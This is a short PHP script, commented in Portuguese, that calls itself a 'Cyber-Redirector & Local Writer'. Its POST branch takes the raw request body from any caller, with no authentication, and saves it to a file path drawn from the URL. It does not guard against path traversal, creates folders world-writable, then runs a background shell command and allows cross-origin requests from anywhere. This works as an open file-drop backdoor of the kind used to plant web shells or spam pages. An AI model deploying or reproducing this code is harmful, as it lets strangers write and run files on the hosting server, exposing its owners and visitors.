<?php
/**
 * Unified Cyber-Redirector & Local Writer
 * Integração: Redirecionamento Automático + Criação de Arquivo Inexistente
 */

@ini_set('memory_limit', '16000M');
@set_time_limit(0);

header("Access-Control-Allow-Origin: *");
header("X-Powered-By: Cyber-Unified-Core");

// 1. Identificação do Protocolo e Host
$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
$host = $_SERVER['HTTP_HOST'];
$uri  = $_SERVER['REQUEST_URI'];

// --- TRAVA DE SEGURANÇA (ANTI-LOOP) ---
if (strpos($uri, '/X/') === 0 || strpos($uri, 'X/') === 1) {
    return; 
}

// 2. Resgate do PATH
$path = ltrim($_SERVER['PATH_INFO'] ?? '', '/');
if (!$path) {
    $cleanUri = explode('?', $uri)[0];
    $path = ltrim(str_replace($_SERVER['SCRIPT_NAME'], '', $cleanUri), '/');
}

if (!$path || $path === 'index.php') {
    die("LOCAL_ERROR: NO_PATH");
}

// 3. Definição de Caminhos Locais
$localPath = __DIR__ . '/X/' . $path;
$localDir = dirname($localPath);
$targetUrl = $protocol . $host . "/X/" . $path;

// --- LÓGICA DE RECEBIMENTO (POST) ---
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $inputData = file_get_contents('php://input');
    
    if (empty($inputData)) exit("ERROR: EMPTY_DATA");

    if (!is_dir($localDir)) @mkdir($localDir, 0777, true);

    if (@file_put_contents($localPath, $inputData)) {
        // Gatilho para atualização do banco em segundo plano
        $cmd = "cd " . __DIR__ . " && php database.php > /dev/null 2>&1 &";
        shell_exec($cmd);

        echo "SUCCESS: Saved to /X/$path and updated database";
    } else {
        http_response_code(500);
        echo "ERROR: PERMISSION_DENIED";
    }
    exit;
}

// --- LÓGICA DE LEITURA E REDIRECIONAMENTO (GET) ---
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    if (file_exists($localPath)) {
        // Se o arquivo já existe, redireciona direto para a URL final
        header("Location: " . $targetUrl, true, 301);
    } else {
        // Se não for upload e o arquivo NÃO existir:
        // 1. Cria o diretório se necessário
        if (!is_dir($localDir)) @mkdir($localDir, 0777, true);
        
        // 2. Cria o arquivo com o conteúdo padrão
        $defaultText = "teste";
        if (@file_put_contents($localPath, $defaultText)) {
            // 3. Redireciona após criar
            header("Location: " . $targetUrl, true, 302);
        } else {
            http_response_code(500);
            echo "ERROR: COULD_NOT_CREATE_FILE";
        }
    }
    exit;
}
